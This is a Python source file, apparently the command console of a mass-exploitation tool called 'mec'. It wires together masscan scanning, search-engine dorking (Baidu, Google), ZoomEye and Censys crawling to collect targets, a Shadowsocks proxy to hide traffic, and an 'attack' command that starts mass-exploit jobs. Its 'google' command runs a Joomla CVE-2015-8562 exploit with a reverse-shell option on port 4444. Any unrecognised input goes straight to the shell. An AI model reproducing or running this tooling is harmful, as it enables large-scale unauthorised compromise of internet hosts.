#!/usr/bin/python3
# pylint: disable=too-few-public-methods,too-many-instance-attributes,too-many-statements,too-many-branches,too-many-locals,too-many-nested-blocks,broad-except,too-many-arguments,unused-argument

'''
handles user commands
'''
import os
import subprocess
import sys

from lib.cli import colors, console, futil
from lib.tools import baidu, censys, scan, zoomeye


class Command:
    """
    holds a command along with its documentation, and helper

    params
    =====

    names: tuple of names - ("name1", "name2")
    doc: documentation, single line - "this is a documentation"
    helper: a function - command_1()
    """

    def __init__(self, names, doc, session, helper):
        """
        init this command
        """
        self.helper = helper
        self.names = names
        self.doc = doc
        self.session = session

    def run(self, args):
        """
        run this command
        """
        self.helper(session=self.session, args=args)


# Initialize commands
COMMANDS = {}


def run_masscan(**kwargs):
    """
    run masscan external tool, mass scale internet scanner
    """
    session = kwargs.get("session", None)
    # check root, as masscan requires root privilege

    if not session.is_root:
        console.print_error(
            "[-] Please run mec as root in order to run masscan")

        return

    ports = console.input_check(
        "[?] What ports do you want to scan (eg. 80 443)? ").split()

    try:
        scan.masscan(ports)
    except KeyboardInterrupt:
        console.print_warning("[-] masscan exited")


def run_info(**kwargs):
    """
    mec status
    """
    session = kwargs.get("session", None)

    if session.shadowsocks.is_usable():
        session.proxy_status = "OK"
    colors.colored_print(
        f'''
session
-------

[*] Current directory: {os.getcwd()}
[*] Root directory: {session.init_dir}
[*] Log file: {session.logfile}
[*] Target: {session.ip_list}

PROXY
-----

[*] Shadowsocks config: {session.shadowsocks.ss_url}
[*] Shadowsocks local port: {session.shadowsocks.local_port}
[*] Shadowsocks connectivity: {session.proxy_status}
''',
        colors.CYAN)


def run_init(**kwargs):
    """

    Return to init directory
    """
    session = kwargs.get("session")

    colors.colored_print('[*] Going back to init_dir...', colors.BLUE)
    os.chdir(session.init_dir)


def run_baidu(**kwargs):
    """
    Search via m.baidu.com
    """
    session = kwargs.get("session")
    command = kwargs.get("args")

    try:
        dork = command[0]
        count = int(command[1])
        os.chdir(session.out_dir)
        colors.colored_print('[*] Searching on Baidu...', colors.PURPLE)
        baidu.spider(dork, count)

        if console.yes_no("\n[?] Use collected URLs as target?"):
            session.ip_list = session.out_dir + "/result.txt"

    except (EOFError, KeyboardInterrupt, SystemExit):
        console.print_warning("[-] Interrupted")
        return
    except BaseException as exc:
        console.print_error(f"[-] Error: {exc}")
        console.debug_except()


def run_target(**kwargs):
    """
    Change target list
    """
    session = kwargs.get("session")
    target = kwargs.get("args")[0]

    if target not in os.listdir(session.init_dir + '/data'):
        console.print_error("[-] Target file not found")

        return
    colors.colored_print(
        '[i] Target changed to {}'.format(target), colors.BLUE)
    session.ip_list = session.init_dir + \
        '/data/' + target


def run_proxy(**kwargs):
    """
    Start ss-proxy
    """
    session = kwargs.get("session")

    session.shadowsocks.start_ss_proxy()

    # write proxy.conf
    proxyconf = open(session.proxy_conf, "w+")
    proxyconf.write(session.proxychains_conf)
    proxyconf.close()

    # set proxy_status
    session.proxy_status = "DISCONNECTED"


def run_google(**kwargs):
    """
    Search via google
    """
    dork = kwargs.get("args")[0]

    try:
        # well yes im a lazy guy
        subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                         '--dork', dork,
                         '--revshell=\'127.0.0.1\'',
                         '--port=4444'])
    except BaseException as err:
        console.print_error(str(err))
        console.debug_except()


def run_zoomeye(**kwargs):
    """
    Crawler for ZoomEye
    """

    try:
        console.print_warning(
            "[*] ZoomEye now asks for phone verification (+86 only)")
        zoomeye.run()
    except (EOFError, KeyboardInterrupt, SystemExit):
        return
    except BaseException:
        console.debug_except()


def run_censys(**kwargs):
    """
    Crawler for Censys.io
    """
    session = kwargs.get("session", None)

    try:
        output = censys.start()

        if console.yes_no("\n[?] Use collected URLs as target?"):
            session.ip_list = session.init_dir + "/" + output
            colors.colored_print(
                '[i] Target changed to {}'.format(
                    session.ip_list), colors.BLUE)

    except BaseException:
        return


def run_exploits(**kwargs):
    """
    List all usable exploits
    """
    do_print = kwargs.get("do_print", True)
    exp_list = futil.list_exp()
    if do_print:
        # pass this list to readline completer
        return exp_list

    colors.colored_print('[+] Available exploits: ', colors.CYAN)

    for poc in exp_list:
        colors.colored_print(poc, colors.BLUE)
    return None


def run_help(**kwargs):
    """
    Display this help info
    """
    help_entries = ['\n', "Command"+' '*20+"Description",

                    '-'*len("Command")+' '*20+'-'*len("Description"),
                    '\n',

                    "clear (c)"+' '*(27-len('clear (c)')) +
                    "Clear screen",

                    "reset (x)"+' '*(27-len('reset (x)'))+"Terminal reset",

                    "init (i)"+' '*(27-len('init (i)')) +
                    "Return to mec root directory",

                    "help (?)"+' '*(27-len('help (?)')) +
                    "Display this help info",

                    "quit (^C)"+' '*(27-len('quit (^C)'))+"Quit",

                    "attack (e)"+' '*(27-len('attack (e)')) +
                    "Start a mass-exploit job"]

    for key, val in COMMANDS.items():
        help_entries.append(key +
                            ' '*(27-len(key)) +
                            val.doc)

    help_entries.append("(others)"+' '*(27-len('(others)')) +
                        "Treated as shell commands")
    help_info = colors.CYAN + '\n'.join(help_entries) + colors.END

    print(help_info)


def cmds_init(session):
    """
    generate COMMANDS dict
    """
    # masscan
    masscan_cmd = Command(("masscan", "ms"),
                          "Run masscan to collect target hosts, requires root",
                          session=session,
                          helper=run_masscan)
    COMMANDS.update({"masscan": masscan_cmd})

    # info
    info_cmd = Command(("info", "information"),
                       "Current mec settings, and proxy status",
                       session=session,
                       helper=run_info)
    COMMANDS.update({"info": info_cmd})

    # target
    target_cmd = Command(names=("target", "t"),
                         doc="Change target list",
                         session=session,
                         helper=None)
    COMMANDS.update({"target": target_cmd})

    # init
    init_cmd = Command(names=("init", "i"),
                       doc="Return to mec root directory",
                       session=session,
                       helper=run_init)
    COMMANDS.update({"init": init_cmd})

    # baidu
    baidu_cmd = Command(names=("baidu"),
                        doc="Search via m.baidu.com",
                        session=session,
                        helper=run_baidu)
    COMMANDS.update({"baidu": baidu_cmd})

    # proxy
    proxy_cmd = Command(names=("proxy"),
                        doc="Start ss-proxy using ./data/ss.json config",
                        session=session,
                        helper=run_proxy)
    COMMANDS.update({"proxy": proxy_cmd})

    # google
    google_cmd = Command(names=("google"),
                         doc="Fetch URLs from Google using custom dork",
                         session=session,
                         helper=run_google)
    COMMANDS.update({"google": google_cmd})

    # zoomeye
    zoomeye_cmd = Command(names=("zoomeye"),
                          doc="Crawler for ZoomEye",
                          session=session,
                          helper=run_zoomeye)
    COMMANDS.update({"zoomeye": zoomeye_cmd})

    # censys
    censys_cmd = Command(names=("censys"),
                         doc="Crawler for Censys.io",
                         session=session,
                         helper=run_censys)
    COMMANDS.update({"censys": censys_cmd})

    # exploits
    exploits_cmd = Command(names=("exploits"),
                           doc="List all usable exploits",
                           session=session,
                           helper=run_exploits)
    COMMANDS.update({"exploits": exploits_cmd})

    # help
    help_cmd = Command(names=("help", "h", "?"),
                       doc="Display this help info",
                       session=session,
                       helper=run_help)
    COMMANDS.update({"help": help_cmd})

    return COMMANDS


def cmd_handler(session, user_cmd):
    '''
    handles user input in console
    '''
    if user_cmd == '':
        return

    # parse user_cmd
    try:
        split_cmd = str(user_cmd).lower().strip().split()
        user_cmd = split_cmd[0]
        args = split_cmd[1:]
    except IndexError:
        return

    if user_cmd in ('q', 'quit'):
        futil.check_kill_process('ss-proxy')
        sys.exit(0)

    elif user_cmd in ('x', 'reset'):
        os.system("reset")

    elif user_cmd in ('c', 'clear'):
        os.system("clear")

    elif user_cmd in ("attack", "e"):
        session.attack()

    else:
        # COMMANDS
        cmds_init(session)
        cmd_obj = COMMANDS.get(user_cmd, None)
        if cmd_obj is not None:
            cmd_obj.run(args)
            return

        # shell command
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Exec: " +
                colors.END,
                colors.GREEN +
                user_cmd, colors.END)
            os.system(user_cmd)
        except (EOFError, KeyboardInterrupt, SystemExit):
            return
